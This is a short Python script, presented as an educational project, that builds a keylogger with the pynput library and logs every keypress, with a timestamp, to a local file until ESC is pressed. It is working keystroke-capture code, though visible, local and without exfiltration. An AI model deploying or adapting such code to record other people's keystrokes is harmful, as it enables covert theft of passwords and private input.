# - Topics:
# - Learn how keyloggers work and how they can be implemented in Python for educational purposes.
# - Project:
# - Build a simple keylogger using the pynput library to capture keystrokes and store them in a log file.


from pynput import keyboard
import logging

# Configure logging
logging.basicConfig(
    filename="keylog.txt",  # Log file name
    level=logging.DEBUG,    # Log level
    format="%(asctime)s - %(message)s"  # Log format
)

def on_press(key):
    """Callback function triggered when a key is pressed."""
    try:
        # Log the key pressed
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl)
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """Callback function triggered when a key is released."""
    # Stop the keylogger if the escape key is pressed
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Set up the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press ESC to stop.")
    listener.join()